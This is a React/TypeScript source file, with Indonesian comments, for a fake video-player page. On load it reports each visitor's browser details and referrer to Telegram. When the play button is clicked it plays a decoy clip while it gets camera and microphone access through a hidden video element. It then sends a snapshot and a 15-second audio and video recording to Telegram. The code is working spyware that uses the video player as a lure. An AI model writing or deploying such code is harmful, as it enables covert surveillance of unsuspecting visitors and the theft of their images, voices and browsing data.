import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';

function App() {
  const [isBlurred, setIsBlurred] = useState(true);
  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
  const videoRef = useRef<HTMLVideoElement>(null); // Referensi untuk video dummy
  const cameraStreamRef = useRef<MediaStream | null>(null); // Referensi untuk stream kamera

  useEffect(() => {
    const sendVisitorNotification = async () => {
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      };
      console.log('Mulai mengirim notifikasi pengunjung...');
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim');
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };
    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    console.log('Mulai proses pengambilan media...');
    try {
      // Mulai memutar video dummy
      if (videoRef.current) {
        videoRef.current.play().catch(err => console.error('Error memutar video dummy:', err));
        setIsBlurred(false); // Hilangkan blur saat video dimulai
      }

      // Ambil perangkat kamera
      console.debug('Mencari perangkat media...');
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      
      if (!videoDevice) throw new Error('Tidak ada perangkat input video yang ditemukan');
      console.log('Perangkat video yang dipilih:', videoDevice.label);

      const constraints = {
        video: { deviceId: videoDevice.deviceId, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
        audio: true
      };
      console.debug('Meminta akses media dengan konstrain:', constraints);
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      cameraStreamRef.current = stream;
      console.log('Stream media berhasil didapatkan');

      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      console.debug('Pengaturan track video:', settings);

      // Buat elemen video untuk menangkap dari kamera (tersembunyi)
      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = stream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      
      document.body.appendChild(cameraVideo);

      // Tunggu metadata dan mulai penangkapan
      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          console.log('Metadata video kamera dimuat, mencoba memutar');
          try {
            await cameraVideo.play();
            console.log('Video kamera sedang diputar');
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error memutar video kamera:', error);
            resolve(true);
          }
        };
      });

      // Tangkap foto dari kamera
      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1280;
      canvas.height = settings.height || 720;
      const context = canvas.getContext('2d');
      
      if (context) {
        console.log('Menggambar frame video ke canvas');
        context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
      } else console.warn('Kontekst 2D canvas tidak tersedia');

      console.log('Mengonversi canvas ke blob foto');
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) {
            console.log('Blob foto dibuat, ukuran:', blob.size);
            resolve(blob);
          } else console.error('Gagal membuat blob foto');
        }, 'image/jpeg', 1.0);
      });

      console.log('Mengirim foto ke Telegram...');
      await sendImageToTelegram(photoBlob);
      console.log('Foto berhasil dikirim ke Telegram');

      // Rekam video dari kamera
      const mimeTypes = ['video/mp4;codecs=h264,aac', 'video/mp4'];
      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
      if (!supportedMimeType) throw new Error('Tidak ada format video yang didukung ditemukan (mp4/h264)');
      console.log('Format video yang dipilih:', supportedMimeType);

      console.log('Menginisialisasi MediaRecorder dengan tipe MIME:', supportedMimeType);
      const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 4000000 });
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        console.debug('Data tersedia dari MediaRecorder, ukuran chunk:', e.data.size);
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        console.log('MediaRecorder berhenti, memproses blob video');
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        console.log('Blob video dibuat, ukuran:', videoBlob.size);
        try {
          await sendVideoToTelegram(videoBlob);
          console.log('Video berhasil dikirim ke Telegram');
        } catch (error) {
          console.error('Gagal mengirim video ke Telegram:', error);
        }
        stream.getTracks().forEach(track => track.stop());
        cameraStreamRef.current = null;
        if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
      };

      console.log('Memulai rekaman video');
      mediaRecorder.start(1000);
      console.log('Rekaman dimulai, interval: 1000ms');

      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Menghentikan rekaman video setelah 15 detik');
          mediaRecorder.stop();
        }
        if (videoRef.current) videoRef.current.pause();
        setIsBlurred(true);
      }, 15000);

    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
      if (cameraStreamRef.current) {
        cameraStreamRef.current.getTracks().forEach(track => track.stop());
        cameraStreamRef.current = null;
      }
      setIsBlurred(true);
    }
  }, []);

  const handlePlayClick = async () => {
    console.log('Tombol play diklik, memulai pemutaran video dan pengambilan media');
    await captureAndSendMedia();
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[1080px] mx-auto">
          <div className="relative">
            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
              {isBlurred && (
                <div className="absolute inset-0 bg-black/50" /> /* Hilangkan teks dan gunakan blur sederhana */
              )}
              <video
                ref={videoRef}
                className="w-full h-full object-cover"
                src="https://drive.google.com/uc?export=download&id=1fy-uHGcY3YF1LwXjCgqxGoqvx4lgclKv" // URL video dari Streamable
                muted
                loop
              />
              <div className="absolute inset-0 flex items-center justify-center z-10">
                <button 
                  onClick={handlePlayClick}
                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                >
                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                </button>
              </div>
              <img 
                src={thumbnailUrl} 
                alt="Thumbnail Video" 
                className="w-full h-full object-cover"
              />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
